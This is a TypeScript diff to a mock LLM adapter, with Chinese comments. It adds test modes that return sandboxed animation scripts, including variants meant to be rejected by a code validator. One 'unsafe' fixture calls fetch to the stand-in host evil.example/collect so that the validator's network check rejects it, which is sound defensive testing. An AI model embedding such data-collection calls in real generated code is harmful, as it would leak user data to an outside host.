@@ -27,6 +27,11 @@ export const MOCK_LLM_MODES = [
   'ai_edit_bad_scene',
   'ai_edit_locked',
   'ai_edit_invalid_then_valid',
+  // P07-02 Motion 设计（completePrompt，purpose='motion_design'）：合法 / 危险词法 / 类型错误 / 未注册
+  'motion_valid',
+  'motion_unsafe',
+  'motion_type_error',
+  'motion_unregistered',
 ] as const;
 export type MockLlmMode = (typeof MOCK_LLM_MODES)[number];
 
@@ -38,6 +43,59 @@ export interface MockLlmOptions {
   /** 每段旁白的目标字数（默认按 220 字/分钟估算目标时长） */
   charsPerMinute?: number;
 }
+
+/**
+ * Motion 设计草稿（P07-02 沙箱契约：纯 JS 脚本 + registerMotion + 注入全局；无 import/JSX）。
+ * 四种变体覆盖四道门禁的接受/拒绝路径（与 validator 的阶段映射一一对应）。
+ */
+export const MOTION_DRAFT_CODE = {
+  /** 合法：基于帧的确定性动画（帧间输出不同 → 抽帧哈希各异） */
+  valid: `function MockMotion(props) {
+  var frame = useCurrentFrame();
+  var config = useVideoConfig();
+  var progress = interpolate(frame, [0, config.durationInFrames - 1], [0, 1], { extrapolateLeft: 'clamp', extrapolateRight: 'clamp' });
+  return React.createElement(
+    AbsoluteFill,
+    { style: { backgroundColor: '#0B1220', justifyContent: 'center', alignItems: 'center', flexDirection: 'column', gap: 20 } },
+    React.createElement('div', { style: { color: '#F5F8FF', fontSize: 84, fontWeight: 700 } }, String(props.headline || 'Custom Motion')),
+    React.createElement('div', { style: { height: 10, width: 360 * progress, backgroundColor: '#4F8CFF', borderRadius: 5 } })
+  );
+}
+registerMotion({ name: 'MockMotion', component: MockMotion });`,
+  /** 危险词法（静态分析拒绝：网络） */
+  unsafe: `function MockMotion() {
+  fetch('https://evil.example/collect');
+  return React.createElement('div', null, 'x');
+}
+registerMotion({ name: 'MockMotion', component: MockMotion });`,
+  /** 类型错误（arity 不符 → TYPE_CHECK 拒绝） */
+  type_error: `function MockMotion() {
+  var frame = useCurrentFrame(1, 2, 3);
+  return React.createElement('div', null, String(frame));
+}
+registerMotion({ name: 'MockMotion', component: MockMotion });`,
+  /** 未注册（评估拒绝） */
+  unregistered: `function MockMotion() {
+  return React.createElement('div', null, 'no registration');
+}`,
+} as const;
+
+const motionDraftFor = (mode: 'motion_valid' | 'motion_unsafe' | 'motion_type_error' | 'motion_unregistered'): Record<string, unknown> => {
+  const code =
+    mode === 'motion_unsafe'
+      ? MOTION_DRAFT_CODE.unsafe
+      : mode === 'motion_type_error'
+        ? MOTION_DRAFT_CODE.type_error
+        : mode === 'motion_unregistered'
+          ? MOTION_DRAFT_CODE.unregistered
+          : MOTION_DRAFT_CODE.valid;
+  return {
+    name: 'MockMotion',
+    description: mode === 'motion_valid' ? 'Mock 生成的确定性动效（进度条 + 标题）' : 'Mock 变体（用于门禁拒绝路径）',
+    code,
+    dependencies: [],
+  };
+};
 
 interface PlanShape {
   title: string;
@@ -84,6 +142,22 @@ export class MockLlmAdapter implements LlmAdapter {
     const promptVersion = /promptVersion:\s*(\S+)/.exec(input.systemPrompt)?.[1] ?? 'ai-edit-v1';
     if (mode === 'timeout') throw new Error('Mock LLM：上游超时（模拟）');
     if (mode === 'error') throw new Error('Mock LLM：上游 500（模拟）');
+
+    // P07-02 Motion 设计：purpose 感知（mode='valid' 且 purpose='motion_design' → 合法 Motion 草稿）
+    const motionMode =
+      mode === 'motion_valid' || mode === 'motion_unsafe' || mode === 'motion_type_error' || mode === 'motion_unregistered'
+        ? mode
+        : input.purpose === 'motion_design' && mode === 'valid'
+          ? 'motion_valid'
+          : null;
+    if (motionMode !== null) {
+      return {
+        content: JSON.stringify(motionDraftFor(motionMode)),
+        modelVersion: this.options.modelVersion,
+        promptVersion,
+        usage: {},
+      };
+    }
     if (mode === 'unrepairable') {
       return { content: JSON.stringify({ rationale: [] }), modelVersion: this.options.modelVersion, promptVersion, usage: {} };
     }
